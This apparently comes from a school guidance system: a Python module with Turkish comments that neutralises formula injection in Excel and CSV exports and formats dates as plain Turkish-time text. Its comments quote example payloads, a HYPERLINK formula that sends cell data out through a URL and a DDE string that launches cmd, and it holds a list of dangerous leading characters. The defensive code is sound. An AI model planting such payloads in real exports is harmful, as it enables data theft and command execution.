"""[2026-11-04] Güvenlik denetimi — Excel formül enjeksiyonu.

openpyxl "=" ile başlayan her metni formül hücresi olarak yazar. Öğrencinin kendi yazdığı alanlar (ad soyad, anket açık uçlu
cevabı, görüşme notu vb.) rehberin indirdiği Excel'e girdiğinde `=HYPERLINK("https://…?"&B2;"Tıkla")` gibi bir değer
çalışır ve diğer öğrencilerin verisini dışarı taşıyabilirdi. Sistem hiçbir Excel çıktısında bilerek formül üretmez; bu yüzden
kaydetmeden hemen önce her formül hücresi düz metne çevrilir (değer aynen görünür, çalışmaz). Tüm çıktılar `guvenli_kaydet`ten geçer.
"""
from __future__ import annotations


def formulleri_metne_cevir(wb) -> int:
    n = 0
    for ws in wb.worksheets:
        for satir in ws.iter_rows():
            for c in satir:
                if c.data_type == "f":
                    c.data_type = "s"
                    n += 1
    return n


def tarihleri_metne_cevir(wb) -> int:
    """[2026-11-04] Kullanıcı kuralı: Excel'de değerler düz metin gelsin; tarih-saat gün.ay.yıl saat:dakika:saniye (Türkiye saati)."""
    from datetime import date, datetime
    from zoneinfo import ZoneInfo
    tr = ZoneInfo("Europe/Istanbul")
    n = 0
    for ws in wb.worksheets:
        for satir in ws.iter_rows():
            for c in satir:
                v = c.value
                if isinstance(v, datetime):
                    v = v.astimezone(tr) if v.tzinfo else v
                    c.value = v.strftime("%d.%m.%Y %H:%M:%S") if (v.hour, v.minute, v.second) != (0, 0, 0) else v.strftime("%d.%m.%Y")
                    n += 1
                elif isinstance(v, date):
                    c.value = v.strftime("%d.%m.%Y")
                    n += 1
    return n


def guvenli_kaydet(wb, hedef) -> None:
    formulleri_metne_cevir(wb)
    tarihleri_metne_cevir(wb)
    wb.save(hedef)


# [2026-11-15] Güvenlik denetimi — CSV formül enjeksiyonu. CSV'de hücre türü yoktur: Excel "=", "+", "-", "@" (ve sekme /
# satır başı) ile başlayan metni formül sayar. Kullanıcının yazdığı ad soyad ya da erişim kaydındaki istek yolu
# ("+cmd|' /C calc'!A0" gibi) yöneticinin bilgisayarında çalışabilirdi. Bu karakterlerle başlayan METİN başına ' alır
# (Excel'de görünmez, değer metin kalır). Sayılar (ör. -3,5) olduğu gibi kalır.
_CSV_TEHLIKELI = ("=", "+", "-", "@", "\t", "\r")


def csv_hucre(deger):
    if isinstance(deger, str) and deger.startswith(_CSV_TEHLIKELI):
        return "'" + deger
    return deger


def csv_satir(degerler) -> list:
    return [csv_hucre(d) for d in degerler]


class _GuvenliCsvYazici:
    def __init__(self, yazici):
        self._y = yazici

    def writerow(self, degerler):
        return self._y.writerow(csv_satir(degerler))

    def writerows(self, satirlar):
        for s in satirlar:
            self.writerow(s)


def guvenli_csv_yazici(tampon, **ayar):
    """csv.writer yerine: her hücre csv_hucre'den geçer. Tüm CSV dışa aktarımları bunu kullanır."""
    import csv
    return _GuvenliCsvYazici(csv.writer(tampon, **ayar))
